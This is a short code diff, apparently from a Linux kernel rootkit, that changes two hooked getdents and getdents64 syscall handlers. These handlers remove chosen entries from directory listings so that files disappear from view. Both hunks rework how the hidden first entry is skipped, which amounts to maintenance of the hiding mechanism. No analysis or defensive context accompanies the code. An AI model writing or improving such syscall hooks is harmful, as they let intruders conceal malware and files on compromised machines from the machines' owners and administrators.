@@ -79,7 +79,7 @@ asmlinkage int hooked_getdents64(const struct pt_regs * pt_regs)
             if (dir == kdirent)
             {
                 ret -= dir->d_reclen;
-                memmove(dir, (void*)dir + dir->d_reclen, ret);
+                kdirent = (void*)dir + dir->d_reclen;
                 continue;
             }
             prev->d_reclen += dir->d_reclen;
@@ -162,7 +162,7 @@ asmlinkage int hooked_getdents(const struct pt_regs * pt_regs)
             if (dir == kdirent)
             {
                 ret -= dir->d_reclen;
-                memmove(dir, (void*)dir + dir->d_reclen, ret);
+                kdirent = (void*)dir + dir->d_reclen;
                 continue;
             }
             prev->d_reclen += dir->d_reclen;
